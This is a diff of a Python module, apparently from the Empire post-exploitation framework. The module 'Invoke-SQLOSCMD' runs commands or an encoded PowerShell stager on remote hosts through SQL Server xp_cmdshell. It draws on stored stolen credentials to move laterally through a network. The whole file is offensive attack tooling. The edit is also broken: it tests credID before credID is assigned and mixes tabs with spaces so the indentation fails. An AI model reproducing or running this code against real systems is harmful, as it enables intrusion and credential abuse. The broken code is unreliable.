@@ -1,31 +1,20 @@
 from lib.common import helpers
-
 class Module:
-
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             'Name': 'Invoke-SQLOSCMD',
-
             'Author': ['@nullbind', '@0xbadjuju'],
-
             'Description': ('Executes a command or stager on remote hosts using xp_cmdshell.'),
-
             'Background' : False,
-
             'OutputExtension' : None,
             
             'NeedsAdmin' : False,
-
             'OpsecSafe' : True,
-
             'Language' : 'powershell',
-
             'MinLanguageVersion' : '2',
             
             'Comments': []
         }
-
         self.options = {
             'Agent' : {
                 'Description'   :   'Agent to run module on.',
@@ -78,41 +67,35 @@ class Module:
                 'Value'         :   'default'
             }
         }
-        
-        self.mainMenu = mainMenu
 
+        self.mainMenu = mainMenu
         for param in params:
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
-
-
     def generate(self):
-        
-        listenerName = self.options['Listener']['Value']
+
+        if credID != "":
+            if not self.mainMenu.credentials.is_credential_valid(credID):
+                print helpers.color("[!] CredID is invalid!")
+                return ""
+            (credID, credType, domainName, username, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
+            if domainName != "":
+                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(username)
+            else:
+                self.options["UserName"]['Value'] = str(username)
+            if password != "":
+                self.options["Password"]['Value'] = password
+
+		listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         instance = self.options['Instance']['Value']
         command = self.options['Command']['Value']
-        userName = self.options['UserName']['Value']
+        username = self.options['UserName']['Value']
         password = self.options['Password']['Value']
         credID = self.options["CredID"]['Value']
-        
-        if credID != "":
-            
-            if not self.mainMenu.credentials.is_credential_valid(credID):
-                print helpers.color("[!] CredID is invalid!")
-                return ""
-
-            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
-
-            if domainName != "":
-                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
-            else:
-                self.options["UserName"]['Value'] = str(userName)
-            if password != "":
-                self.options["Password"]['Value'] = password
 
 
         moduleSource = self.mainMenu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
@@ -123,19 +106,25 @@ class Module:
         except:
             print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
             return ""
-
         script = moduleCode
-                
+
+
         if command == "":
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 print helpers.color("[!] Invalid listener: " + listenerName)
                 return ""
             else:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-
                 if launcher == "":
                     return ""
                 else:
                     command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-        script += "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)          
+
+
+		script += "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)  
+
+		if username != "":
+            script += " -UserName "+username
+        if password != "":
+		    script += " -Password "+password
         return script
